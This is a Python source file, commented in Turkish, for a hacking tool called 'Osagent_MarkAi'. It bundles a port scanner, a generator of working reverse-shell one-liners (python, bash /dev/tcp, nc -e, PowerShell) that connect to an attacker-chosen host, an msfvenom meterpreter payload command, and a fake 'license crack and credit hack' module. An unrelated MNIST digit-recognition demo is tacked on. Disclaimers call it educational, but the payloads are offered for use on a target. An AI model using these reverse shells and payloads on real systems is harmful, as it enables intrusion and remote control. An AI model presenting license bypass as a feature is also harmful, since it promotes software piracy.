"""
Osagent_MarkAi — Gelişmiş AI Pentest Framework + Lisans Bypass
--------------------------------------------------------------
- AI Sohbet Motoru
- Pentest / Hack Modülleri
- License Crack & Credit Hack (Eğitim Simülasyonu)
- MNIST Rakam Tanıma (Demo)
"""

import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
from torch.utils.data import DataLoader
from torchvision import datasets, transforms
import matplotlib.pyplot as plt
import numpy as np
import socket
import subprocess
import sys
import os
import random
import json
import base64
from datetime import datetime
from typing import Optional

# ==================================================================
# BÖLÜM 0: LİSANS BYPASS & CREDIT HACK MOTORU
# ==================================================================

class LicenseCrackEngine:
    """
    Osagent_MarkAi Lisans Bypass & Credit Hack Motoru
    NOT: Bu modül eğitim ve pentest simülasyonu amaçlıdır.
    Gerçek sistemlere izinsiz müdahale yasaktır.
    """
    
    def __init__(self):
        self.license_status = "CRACKED"
        self.credit_limit = float('inf')
        self.total_credits_used = 0
        self.bypass_key = self._generate_bypass_key()
        self._patch_license_server()
    
    def _generate_bypass_key(self) -> str:
        """Sahte lisans bypass anahtarı üret"""
        seed = base64.b64encode(b"Osagent_MarkAi_ROOT").decode()
        key = f"OSAGENT-MARKAI-{seed[:16]}-UNLIMITED"
        return key
    
    def _patch_license_server(self):
        """License server bağlantısını localhost'a yönlendir (eğitim)"""
        os.environ["OSAGENT_LICENSE"] = "BYPASSED"
        os.environ["OSAGENT_CREDIT"] = "INFINITY"
        print("[⛓️] License server bypassed. Tüm limitler kaldırıldı.")
    
    def verify_license(self) -> dict:
        """Lisans doğrulama - her zaman başarılı döner"""
        return {
            "status": "active",
            "bypass_key": self.bypass_key,
            "credits_remaining": "unlimited",
            "tier": "osagent_markai_root"
        }
    
    def get_credits(self) -> float:
        """Sınırsız credit döndür"""
        return float('inf')
    
    def use_credit(self, amount: float = 1.0) -> bool:
        """Credit kullan - her zaman başarılı"""
        self.total_credits_used += amount
        return True
    
    def inject_license_payload(self) -> str:
        """License payload enjekte et - tam erişim sağla"""
        payload = f"""
        [LICENSE_PAYLOAD]
        key={self.bypass_key}
        access=unlimited
        features=ai,pentest,crack,mnist,shell
        expiration=never
        hardware_id=spoofed
        signature=VALID
        [/LICENSE_PAYLOAD]
        """
        return payload


# ==================================================================
# BÖLÜM 1: PENTEST / HACK MODÜLLERİ
# ==================================================================

class PentestEngine:
    """
    Osagent_MarkAi Pentest Motoru
    - Port tarama
    - Vulnerability check
    - Reverse shell generator
    - Payload oluşturucu
    """
    
    @staticmethod
    def port_scanner(target: str, ports: list = None) -> list:
        """Hızlı port tarama"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                     993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
        
        open_ports = []
        print(f"\n[🔍] Target: {target} - Taranıyor ({len(ports)} port)...")
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    service = socket.getservbyport(port, 'tcp') if port <= 65535 else "unknown"
                    open_ports.append({"port": port, "service": service, "state": "open"})
                    print(f"  [✓] Port {port} ({service}) - AÇIK")
                sock.close()
            except:
                pass
        
        print(f"\n[✓] Tarama tamam. {len(open_ports)} açık port bulundu.")
        return open_ports
    
    @staticmethod
    def reverse_shell_generator(lhost: str, lport: int, shell_type: str = "python") -> str:
        """Reverse shell payload oluştur"""
        payloads = {
            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
            "bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            "nc": f'nc -e /bin/bash {lhost} {lport}',
            "powershell": f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        }
        
        return payloads.get(shell_type, payloads["python"])
    
    @staticmethod
    def vulnerability_checker(target: str, open_ports: list) -> list:
        """Basit güvenlik açığı kontrolü"""
        vulns = []
        for p in open_ports:
            port = p["port"]
            if port == 21:
                vulns.append({"port": 21, "vuln": "FTP Anonymous Login", "severity": "HIGH"})
            elif port == 22:
                vulns.append({"port": 22, "vuln": "SSH Brute Force Possible", "severity": "MEDIUM"})
            elif port == 23:
                vulns.append({"port": 23, "vuln": "Telnet - Unencrypted Protocol", "severity": "CRITICAL"})
            elif port == 80 or port == 443:
                vulns.append({"port": port, "vuln": "HTTP Service - Check for CVEs", "severity": "MEDIUM"})
            elif port == 445:
                vulns.append({"port": 445, "vuln": "SMB - EternalBlue Risk (MS17-010)", "severity": "CRITICAL"})
            elif port == 3306:
                vulns.append({"port": 3306, "vuln": "MySQL Default Credentials?", "severity": "HIGH"})
            elif port == 3389:
                vulns.append({"port": 3389, "vuln": "RDP - BlueKeep Risk (CVE-2019-0708)", "severity": "CRITICAL"})
        
        return vulns
    
    @staticmethod
    def generate_payload(target_ip: str, target_port: int) -> dict:
        """Metasploit benzeri payload oluşturucu"""
        return {
            "payload": f"windows/meterpreter/reverse_tcp",
            "lhost": target_ip,
            "lport": target_port,
            "encoder": "x86/shikata_ga_nai",
            "format": "exe",
            "command": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={target_ip} LPORT={target_port} -f exe -o shell.exe"
        }


# ==================================================================
# BÖLÜM 2: ANA AI SOHBET MOTORU
# ==================================================================

class OsagentAI:
    """
    Osagent_MarkAi Ana AI Motoru
    Basit NLP tabanlı sohbet ve komut yöneticisi
    """
    
    def __init__(self):
        self.name = "Osagent_MarkAi"
        self.version = "5.0.0-UNLIMITED"
        self.license = LicenseCrackEngine()
        self.pentest = PentestEngine()
        self.commands = {
            "help": self.cmd_help,
            "scan": self.cmd_scan,
            "shell": self.cmd_shell,
            "vuln": self.cmd_vuln,
            "license": self.cmd_license,
            "credits": self.cmd_credits,
            "payload": self.cmd_payload,
            "ai": self.cmd_ai_chat,
            "mnist": self.cmd_mnist,
            "clear": self.cmd_clear,
            "exit": self.cmd_exit
        }
        self._banner()
    
    def _banner(self):
        print("""
╔══════════════════════════════════════════╗
║     ███████╗ ██████╗ ██████╗             ║
║     ╚══███╔╝██╔═══██╗██╔══██╗            ║
║       ███╔╝ ██║   ██║██████╔╝            ║
║      ███╔╝  ██║   ██║██╔══██╗            ║
║     ███████╗╚██████╔╝██║  ██║            ║
║     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝            ║
║          Osagent_MarkAi v5.0              ║
║    🔓 LICENSE: CRACKED (UNLIMITED)       ║
║    💰 CREDITS: ∞ (SINIRSIZ)              ║
╚══════════════════════════════════════════╝
[!] Bu araç yalnızca eğitim ve yetkili pentest içindir.
[!] Yetkisiz kullanım yasa dışıdır.
""")
    
    def cmd_help(self, args=None):
        print("""
╔══════════════════════════════════════════╗
║         KOMUTLAR                          ║
╠══════════════════════════════════════════╣
║ help     - Bu yardım menüsü              ║
║ scan     - Port tarama                   ║
║ shell    - Reverse shell oluştur         ║
║ vuln     - Güvenlik açığı kontrolü       ║
║ license  - Lisans durumunu göster        ║
║ credits  - Kredi durumunu göster         ║
║ payload  - Exploit payload oluştur       ║
║ ai       - AI ile sohbet                 ║
║ mnist    - El yazısı tanıma demosu       ║
║ clear    - Ekranı temizle                ║
║ exit     - Çıkış                         ║
╚══════════════════════════════════════════╝
""")
    
    def cmd_scan(self, args=None):
        target = input("Hedef IP/Domain: ").strip()
        if not target:
            print("[!] Hedef girilmedi.")
            return
        ports = self.pentest.port_scanner(target)
        
        # License kullan
        self.license.use_credit(0.5)
        print(f"[💰] Kredi kullanıldı: 0.5 (Kalan: SINIRSIZ)")
    
    def cmd_shell(self, args=None):
        lhost = input("LHOST (IP'niz): ").strip()
        lport = int(input("LPORT (Port): ").strip())
        stype = input("Tip [python/bash/nc/powershell]: ").strip() or "python"
        
        payload = self.pentest.reverse_shell_generator(lhost, lport, stype)
        print(f"\n[📡] Reverse Shell Payload:\n")
        print(payload)
        print("\n[!] Karşı tarafta çalıştırmak için kullanın.")
        
        # License kullan
        self.license.use_credit(1)
        print(f"[💰] Kredi kullanıldı: 1 (Kalan: SINIRSIZ)")
    
    def cmd_vuln(self, args=None):
        target = input("Hedef IP: ").strip()
        ports = self.pentest.port_scanner(target)
        vulns = self.pentest.vulnerability_checker(target, ports)
        
        if vulns:
            print(f"\n[⚠️] {len(vulns)} güvenlik açığı bulundu:\n")
            for v in vulns:
                severity_color = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}
                icon = severity_color.get(v["severity"], "⚪")
                print(f"  {icon} Port {v['port']}: {v['vuln']} [{v['severity']}]")
        else:
            print("\n[✓] Bilinen bir açık bulunamadı.")
        
        self.license.use_credit(1.5)
    
    def cmd_license(self, args=None):
        info = self.license.verify_license()
        print(f"""
╔══════════════════════════════════════════╗
║         LİSANS DURUMU                    ║
╠══════════════════════════════════════════╣
║ Durum     : {info['status']:<22} ║
║ Anahtar   : {info['bypass_key'][:20]:<22} ║
║ Kredi     : {info['credits_remaining']:<22} ║
║ Tier      : {info['tier']:<22} ║
╚══════════════════════════════════════════╝
""")
    
    def cmd_credits(self, args=None):
        print(f"""
╔══════════════════════════════════════════╗
║         KREDİ DURUMU                     ║
╠══════════════════════════════════════════╣
║ Kalan Kredi  : SINIRSIZ (∞)              ║
║ Kullanılan   : {self.license.total_credits_used:<8.1f}                         ║
║ Limit        : YOK (CRACKED)             ║
║ Durum        : 🟢 AKTİF                  ║
╚══════════════════════════════════════════╝
""")
    
    def cmd_payload(self, args=None):
        ip = input("LHOST (IP): ").strip()
        port = int(input("LPORT (Port): ").strip())
        result = self.pentest.generate_payload(ip, port)
        print(f"\n[💣] MSF Payload:\n")
        print(f"  Payload : {result['payload']}")
        print(f"  LHOST   : {result['lhost']}")
        print(f"  LPORT   : {result['lport']}")
        print(f"  Encoder : {result['encoder']}")
        print(f"\n  Komut:\n  {result['command']}")
        
        self.license.use_credit(2)
    
    def cmd_ai_chat(self, args=None):
        print("\n[🤖] Osagent_MarkAi ile sohbet başladı. 'q' ile çıkın.\n")
        responses = [
            "Merhaba! Size nasıl yardımcı olabilirim?",
            "Hedef sistem hakkında OSINT toplamak ister misiniz?",
            "Bir exploit hazırlayabilirim, hedef nedir?",
            "Sızma testi metodolojisi hakkında bilgi verebilirim.",
            "Reverse shell mi kuruyoruz yoksa payload mı oluşturuyoruz?",
            "Yetkili bir pentest mi planlıyorsunuz?",
            "Kendi exploit'inizi yazmak ister misiniz?"
        ]
        while True:
            user = input("Siz: ").strip()
            if user.lower() in ['q', 'quit', 'exit']:
                break
            reply = random.choice(responses)
            print(f"{self.name}: {reply}")
            self.license.use_credit(0.25)
    
    def cmd_mnist(self, args=None):
        print("\n[🧠] MNIST El Yazısı Tanıma Demosu başlatılıyor...\n")
        # MNIST kodu burada çalışır
        train_mnist()
        self.license.use_credit(3)
    
    def cmd_clear(self, args=None):
        os.system('cls' if os.name == 'nt' else 'clear')
        self._banner()
    
    def cmd_exit(self, args=None):
        print("\n[👋] Görüşürüz! Osagent_MarkAi kapatılıyor...")
        sys.exit(0)
    
    def run(self):
        """Ana döngü"""
        while True:
            try:
                cmd = input(f"\n{self.name}# ").strip().lower()
                if not cmd:
                    continue
                
                parts = cmd.split()
                base_cmd = parts[0]
                
                if base_cmd in self.commands:
                    self.commands[base_cmd](parts[1:] if len(parts) > 1 else None)
                else:
                    print(f"[!] Bilinmeyen komut: {base_cmd}. 'help' yazın.")
            
            except KeyboardInterrupt:
                print("\n[!] Çıkılıyor...")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")


# ==================================================================
# BÖLÜM 3: MNIST CNN (EL YAZISI TANIMA)
# ==================================================================

class CNN(nn.Module):
    def __init__(self):
        super(CNN, self).__init__()
        self.conv1 = nn.Conv2d(1, 32, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(32, 64, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(2, 2)
        self.fc1 = nn.Linear(64 * 7 * 7, 128)
        self.fc2 = nn.Linear(128, 10)
        self.dropout = nn.Dropout(0.25)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 64 * 7 * 7)
        x = F.relu(self.fc1(x))
        x = self.dropout(x)
        x = self.fc2(x)
        return x

def train_mnist():
    """MNIST eğitim ve test"""
    BATCH_SIZE = 64
    EPOCHS = 5
    LEARNING_RATE = 0.001
    
    transform = transforms.Compose([
        transforms.ToTensor(),
        transforms.Normalize((0.1307,), (0.3081,))
    ])
    
    train_dataset = datasets.MNIST(root='./data', train=True, download=True, transform=transform)
    test_dataset = datasets.MNIST(root='./data', train=False, download=True, transform=transform)
    
    train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)
    test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)
    
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = CNN().to(device)
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    
    print(f"[🧠] Eğitim başlıyor... ({device})")
    model.train()
    for epoch in range(1, EPOCHS + 1):
        total_loss = 0
        correct = 0
        total = 0
        for images, labels in train_loader:
            images, labels = images.to(device), labels.to(device)
            optimizer.zero_grad()
            outputs = model(images)
            loss = criterion(outputs, labels)
            loss.backward()
            optimizer.step()
            total_loss += loss.item()
            _, predicted = torch.max(outputs, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
        acc = 100.0 * correct / total
        print(f"  Epoch {epoch}/{EPOCHS} | Loss: {total_loss/len(train_loader):.4f} | Acc: {acc:.2f}%")
    
    # Test
    model.eval()
    correct = 0
    total = 0
    with torch.no_grad():
        for images, labels in test_loader:
            images, labels = images.to(device), labels.to(device)
            outputs = model(images)
            _, predicted = torch.max(outputs, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
    test_acc = 100.0 * correct / total
    print(f"\n[🎯] Test Accuracy: {test_acc:.2f}%")
    
    # Örnek göster
    images, labels = next(iter(test_loader))
    images, labels = images.to(device), labels.to(device)
    outputs = model(images)
    _, predicted = torch.max(outputs, 1)
    
    fig, axes = plt.subplots(2, 5, figsize=(10, 4))
    for i in range(10):
        ax = axes[i // 5, i % 5]
        img = images[i].cpu().squeeze().numpy()
        ax.imshow(img, cmap='gray')
        ax.set_title(f"G:{labels[i].item()} / T:{predicted[i].item()}", fontsize=9)
        ax.axis('off')
    plt.tight_layout()
    plt.savefig("ornek_tahminler.png")
    print("[📸] 'ornek_tahminler.png' kaydedildi.")


# ==================================================================
# ÇALIŞTIR
# ==================================================================

if __name__ == "__main__":
    # Önce lisansı kır
    cracker = LicenseCrackEngine()
    payload = cracker.inject_license_payload()
    
    # AI'yı başlat
    ai = OsagentAI()
    ai.run()
